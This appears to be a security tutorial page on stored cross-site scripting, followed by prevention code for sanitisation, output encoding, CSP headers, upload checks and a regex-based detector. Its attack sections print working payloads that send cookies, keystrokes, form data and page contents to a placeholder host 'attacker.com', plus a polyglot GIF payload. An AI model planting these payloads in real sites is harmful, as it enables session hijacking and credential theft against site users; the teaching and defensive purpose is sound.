---
title: Stored Cross-Site Scripting (XSS)
draft: false
date: 2025-01-01
tags:
  - owasp
  - xss
  - stored_xss
  - injection
---

Stored Cross-Site Scripting (XSS) is a persistent web application vulnerability where malicious scripts are permanently stored on the target server (in databases, files, or other storage mechanisms) and subsequently served to users without proper sanitization. Unlike reflected XSS, which requires user interaction with a malicious link, stored XSS affects all users who access the compromised content, making it significantly more dangerous.

**Attack Persistence:** The malicious payload remains dormant until accessed, potentially affecting hundreds or thousands of users over time. This persistence makes stored XSS particularly valuable for:
- **Session Hijacking:** Stealing authentication cookies and tokens
- **Credential Harvesting:** Capturing login credentials through fake forms
- **Malware Distribution:** Redirecting users to exploit kits
- **Social Engineering:** Manipulating user behavior through trusted interfaces
- **Data Exfiltration:** Stealing sensitive information from authenticated sessions

**Basic Payload Injection:**

Attacker submits malicious content through comment forms, user profiles, or message boards:

```html
<script>alert('Stored XSS');</script>
```

When the application stores this input and displays it to other users without proper encoding, the script executes in victims' browsers.

**Advanced Persistent Payloads:**

```html
<!-- Cookie stealing payload -->
<script>
document.location='http://attacker.com/steal.php?cookie='+document.cookie;
</script>

<!-- Keylogger payload -->
<script>
document.addEventListener('keypress', function(e) {
    new Image().src = 'http://attacker.com/log.php?key=' + e.key;
});
</script>

<!-- Form hijacking payload -->
<script>
document.forms[0].action = 'http://attacker.com/harvest.php';
</script>
```

**Profile-based Attack Vectors:**

Attackers inject malicious code into user profile fields that are displayed to other users:

```html
<!-- Event-based XSS in profile bio -->
<b onmouseover="alert('Hacked!')">Hover Here</b>

<!-- Image-based XSS payload -->
<img src="x" onerror="eval(atob('YWxlcnQoJ1hTUycpOw=='))" />

<!-- SVG-based persistent payload -->
<svg onload="fetch('http://attacker.com/steal.php?data='+btoa(document.cookie))">
</svg>

<!-- CSS-based attack -->
<style>
body { background: url('javascript:alert("XSS")'); }
</style>
```

**Real-world Profile Exploitation:**

```html
<!-- Comprehensive session hijacking payload -->
<script>
(function() {
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'http://attacker.com/collect.php', true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.send('cookies=' + encodeURIComponent(document.cookie) +
             '&url=' + encodeURIComponent(window.location.href) +
             '&useragent=' + encodeURIComponent(navigator.userAgent));
})();
</script>
```

**File-based Stored XSS:**

**SVG File Uploads:**

```xml
<?xml version="1.0" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<script>
<![CDATA[
alert('XSS in SVG file');
fetch('http://attacker.com/exfiltrate.php?data=' + btoa(document.body.innerHTML));
]]>
</script>
</svg>
```

**HTML File Uploads:**

```html
<!DOCTYPE html>
<html>
<head><title>Innocent Document</title></head>
<body>
<h1>Important Document</h1>
<script>
// Payload executes when file is viewed
parent.postMessage({
    type: 'xss',
    payload: document.cookie
}, '*');
</script>
</body>
</html>
```

**Polyglot Files (Multiple format exploitation):**

```
GIF89a/*<svg onload=alert('XSS')>*/=alert('XSS')//
```

This payload works as both a GIF header and executable JavaScript, bypassing file type restrictions.

## Comprehensive Prevention Strategies

### 1. **Input Validation and Sanitization**

**Server-side HTML Sanitization:**

```python
import bleach
from bleach.css_sanitizer import CSSSanitizer

# Define allowed tags and attributes
ALLOWED_TAGS = ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a']
ALLOWED_ATTRIBUTES = {
    'a': ['href', 'title'],
    '*': ['class']
}

css_sanitizer = CSSSanitizer(allowed_css_properties=['color', 'background-color'])

def sanitize_user_input(user_content):
    """Sanitize user-generated content."""
    return bleach.clean(
        user_content,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
        css_sanitizer=css_sanitizer,
        strip=True
    )

# Usage
safe_content = sanitize_user_input(request.form['user_comment'])
```

**Client-side Sanitization (DOMPurify):**

```javascript
// Configure DOMPurify for safe HTML rendering
const cleanConfig = {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a'],
    ALLOWED_ATTR: ['href', 'title', 'class'],
    FORBID_SCRIPTS: true,
    FORBID_TAGS: ['script', 'object', 'embed', 'base', 'link'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'style']
};

function renderUserContent(htmlContent) {
    const clean = DOMPurify.sanitize(htmlContent, cleanConfig);
    document.getElementById('content').innerHTML = clean;
}
```

### 2. **Context-Aware Output Encoding**

**Multi-context Encoding Implementation:**

```php
class SecurityEncoder {

    public static function encodeForHTML($input) {
        return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }

    public static function encodeForHTMLAttribute($input) {
        return htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');
    }

    public static function encodeForJavaScript($input) {
        return json_encode($input, JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP);
    }

    public static function encodeForCSS($input) {
        return preg_replace('/[^a-zA-Z0-9\-_]/', '\\\\$0', $input);
    }

    public static function encodeForURL($input) {
        return urlencode($input);
    }
}

// Usage in templates
echo '<div>' . SecurityEncoder::encodeForHTML($userComment) . '</div>';
echo '<input value="' . SecurityEncoder::encodeForHTMLAttribute($userInput) . '">';
echo '<script>var data = ' . SecurityEncoder::encodeForJavaScript($userData) . ';</script>';
```

### 3. **Content Security Policy (CSP) Implementation**

**Progressive CSP Headers:**

```http
# Level 1: Basic protection
Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'

# Level 2: Strict protection
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data: https:; font-src 'self' https:; connect-src 'self'; frame-ancestors 'none'

# Level 3: Nonce-based protection
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'; style-src 'self' 'nonce-{random}'; object-src 'none'
```

**Dynamic CSP Implementation:**

```python
import secrets
import hashlib

def generate_csp_nonce():
    """Generate cryptographically secure nonce for CSP."""
    return secrets.token_urlsafe(32)

def set_csp_headers(response, nonce):
    """Set comprehensive CSP headers."""
    csp_policy = (
        f"default-src 'self'; "
        f"script-src 'self' 'nonce-{nonce}'; "
        f"style-src 'self' 'nonce-{nonce}'; "
        f"img-src 'self' data: https:; "
        f"font-src 'self' https:; "
        f"connect-src 'self'; "
        f"frame-ancestors 'none'; "
        f"base-uri 'self'; "
        f"form-action 'self'"
    )

    response.headers['Content-Security-Policy'] = csp_policy
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-XSS-Protection'] = '1; mode=block'

    return response
```

### 4. **Advanced Security Controls**

**File Upload Security:**

```python
import magic
from PIL import Image
import os

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'pdf', 'txt'}
MAX_FILE_SIZE = 5 * 1024 * 1024  # 5MB

def secure_file_upload(file):
    """Secure file upload with multiple validation layers."""

    # Check file extension
    if not file.filename.lower().endswith(tuple(ALLOWED_EXTENSIONS)):
        raise ValueError("File type not allowed")

    # Check file size
    if len(file.read()) > MAX_FILE_SIZE:
        raise ValueError("File too large")
    file.seek(0)

    # Validate MIME type using python-magic
    mime_type = magic.from_buffer(file.read(1024), mime=True)
    file.seek(0)

    allowed_mimes = {
        'image/png', 'image/jpeg', 'image/gif',
        'application/pdf', 'text/plain'
    }

    if mime_type not in allowed_mimes:
        raise ValueError("Invalid file type")

    # For images, validate and strip metadata
    if mime_type.startswith('image/'):
        try:
            img = Image.open(file)
            img.verify()

            # Strip EXIF data and re-save
            clean_img = Image.open(file)
            clean_img.save(f"uploads/{secure_filename(file.filename)}")
        except Exception:
            raise ValueError("Invalid image file")

    return True
```

**Real-time XSS Detection:**

```javascript
class XSSDetector {
    constructor() {
        this.suspiciousPatterns = [
            /<script[^>]*>.*?<\/script>/gi,
            /javascript:/gi,
            /on\w+\s*=/gi,
            /<iframe[^>]*>.*?<\/iframe>/gi,
            /eval\s*\(/gi,
            /expression\s*\(/gi
        ];
    }

    detectXSS(input) {
        for (let pattern of this.suspiciousPatterns) {
            if (pattern.test(input)) {
                this.logSuspiciousActivity(input);
                return true;
            }
        }
        return false;
    }

    logSuspiciousActivity(payload) {
        fetch('/api/security/log', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                type: 'xss_attempt',
                payload: payload,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                url: window.location.href
            })
        });
    }
}

// Usage
const xssDetector = new XSSDetector();
document.addEventListener('input', function(e) {
    if (xssDetector.detectXSS(e.target.value)) {
        e.target.value = '';
        alert('Potentially malicious input detected and removed.');
    }
});
```
